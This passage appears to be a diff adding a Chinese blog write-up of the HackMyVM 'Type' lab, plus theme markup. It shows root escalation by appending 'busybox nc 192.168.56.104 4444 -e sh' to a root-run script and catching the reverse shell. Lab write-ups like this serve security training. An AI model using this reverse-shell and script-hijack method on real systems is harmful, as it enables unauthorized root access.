fix this problem.<br><br><span class="hljs-title class_">Available</span> platform plugins <span class="hljs-symbol">are:</span> linuxfb, vkkhrdisplay, minimal, wayland-egl, minimalegl, xcb, vnc, offscreen, wayland, eglfs.<br><br><span class="hljs-title class_">Aborted</span><br><span class="hljs-symbol">Type:</span>~<span class="hljs-variable">$ </span><br><br></code></pre></td></tr></table></figure>
+
+<p>运行此文件需要图形界面。</p>
+<p>使用x11转发图形界面到本地的kali上。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># ssh -X plugugly@192.168.56.58</span><br>plugugly<span class="hljs-meta">@192.168.56.58&#x27;s</span> password: <br>              _                          <br>__      _____|<span class="hljs-string"> </span>|<span class="hljs-string"> ___ ___  _ __ ___   ___ </span><br><span class="hljs-string">\ \ /\ / / _ \ </span>|<span class="hljs-string">/ __/ _ \</span>|<span class="hljs-string"> &#x27;_ ` _ \ / _ \</span><br><span class="hljs-string"> \ V  V /  __/ </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  __/</span><br><span class="hljs-string">  \_/\_/ \___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___\___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___</span>|<br>                                         <br>/usr/bin/xauth:  file /home/plugugly/.Xauthority does not exist<br>Type:~$ <br>Type:~$ export XAUTHORITY=/home/plugugly/.Xauthority<br>Type:~$ sudo /root/typer.py<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_sXvqAMsX4b.png" srcset="/img/loading.gif" lazyload></p>
+<p>是一个打字小游戏，要求我们的wpm大于60</p>
+<p>使用 <code>xdotool</code> 模拟键盘输入</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">sleep</span> <span class="hljs-number">3</span>; xdotool <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-comment">--delay 20 &quot;It was the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair.&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_09T2kkhkbn.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">Type:~<span class="hljs-symbol">$</span> sudo /root/typer.py<br><span class="hljs-function"><span class="hljs-title">Cleanup</span></span> process started by root...<br><br></code></pre></td></tr></table></figure>
+
+<p>启动了某个进程</p>
+<p>上传linpeas分析</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">╔══════════╣ .sh files <span class="hljs-keyword">in</span> path<br>╚ https:<span class="hljs-regexp">//</span>book.hacktricks.wiki<span class="hljs-regexp">/en/</span>linux-hardening<span class="hljs-regexp">/privilege-escalation/i</span>ndex.html<span class="hljs-comment">#scriptbinaries-in-path                                                   </span><br>You can write script: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>cleanup_scores.sh                                                                                                     <br><span class="hljs-regexp">/usr/</span>bin/spirv-lesspipe.sh<br><span class="hljs-regexp">/usr/</span>bin/findssl.sh<br><span class="hljs-regexp">/usr/</span>bin/amuFormat.sh<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Type</span>:~<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> /usr/local/bin/cleanup_scores.sh<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Cleanup process started by root...&#x27;</span><br><span class="hljs-built_in">Type</span>:~<span class="hljs-variable">$</span> <br><br></code></pre></td></tr></table></figure>
+
+<p>由于靶机是极度精简的alpine系统，这里直接写入反弹shell的命令即可</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">Type:</span>~<span class="hljs-variable">$ </span>echo <span class="hljs-string">&quot;busybox nc 192.168.56.104 4444 -e sh&quot;</span> &gt;&gt; /usr/local/bin/cleanup_scores.sh<br><span class="hljs-symbol">Type:</span>~<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> plugugly on <span class="hljs-symbol">Type:</span><br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>, env_keep+=<span class="hljs-title class_">XAUTHORITY</span><br><br><span class="hljs-title class_">Runas</span> <span class="hljs-keyword">and</span> <span class="hljs-title class_">Command</span>-specific defaults <span class="hljs-keyword">for</span> <span class="hljs-symbol">plugugly:</span><br>    <span class="hljs-title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="hljs-string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span><br><br><span class="hljs-title class_">User</span> plugugly may run the following commands on <span class="hljs-symbol">Type:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /root/typer.py<br><span class="hljs-symbol">Type:</span>~<span class="hljs-variable">$ </span>sudo /root/typer.py<br><span class="hljs-title class_">Cleanup</span> process started by root...<br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># ./penelope.py </span><br>[+] Listening <span class="hljs-keyword">for</span> <span class="hljs-built_in">reverse</span> shells <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">4444</span> →  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> • <span class="hljs-number">192.168</span><span class="hljs-number">.21</span><span class="hljs-number">.128</span> • <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.104</span> • <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.150</span> • <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> • <span class="hljs-number">172.18</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got <span class="hljs-built_in">reverse</span> shell <span class="hljs-keyword">from</span> Type<span class="hljs-number">-192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.58</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br>[+] Attempting <span class="hljs-keyword">to</span> upgrade shell <span class="hljs-keyword">to</span> PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting <span class="hljs-keyword">with</span> session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> /root/.penelope/Type~<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.58</span>_Linux_x86_64/<span class="hljs-number">2026</span>_04_24<span class="hljs-number">-03</span>_34_38<span class="hljs-number">-039.</span><span class="hljs-built_in">log</span> 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>/home/plugugly <span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">1</span>(bin),<span class="hljs-number">2</span>(daemon),<span class="hljs-number">3</span>(sys),<span class="hljs-number">4</span>(adm),<span class="hljs-number">6</span>(disk),<span class="hljs-number">10</span>(wheel),<span class="hljs-number">11</span>(floppy),<span class="hljs-number">20</span>(dialout),<span class="hljs-number">26</span>(tape),<span class="hljs-number">27</span>(video)<br>/home/plugugly <span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HVM/" class="print-no-link">#HVM</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackMyVM-Type</div>
+      <div>http://example.com/2026/04/24/HackMyVM-Type/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 24, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/20/Proving-Grounds-Practice-Jacko/" title="Proving Grounds Practice-Jacko">
+                        <span class="hidden-mobile">Proving Grounds Practice-Jacko</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
